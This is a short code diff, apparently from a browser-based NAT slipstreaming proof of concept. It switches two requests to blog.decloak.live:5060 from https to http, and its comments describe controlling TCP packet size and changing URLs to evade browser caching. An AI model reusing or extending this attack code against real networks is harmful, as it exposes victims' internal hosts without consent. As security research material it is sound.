@@ -336,7 +336,7 @@ function maxpktsize()
 
 	// note 'packet_size' length is critical, must be same as other post
 	log('responding to SYN with maximum segment size TCP option to control data size')
-	post("https://blog.decloak.live:5060/samy_pktsiz", pkt, 1)
+	post("http://blog.decloak.live:5060/samy_pktsiz", pkt, 1)
 	log('sending TCP beacon to detect maximum packet size and MTU')
 }
 
@@ -580,7 +580,7 @@ function attemptPin(pkt)
 	// keep changing url to evade browser caching attempts
 	// THE LENGTH OF THE URL MUST BE 12 bytes total, eg /samy_n?0012
 	// to match the same size we got when testing /samy_pktsiz
-	post("https://blog.decloak.live:5060/samy_n?"+incr, pkt, 1)
+	post("http://blog.decloak.live:5060/samy_n?"+incr, pkt, 1)
 }
 
 function post(url, str, reuse)
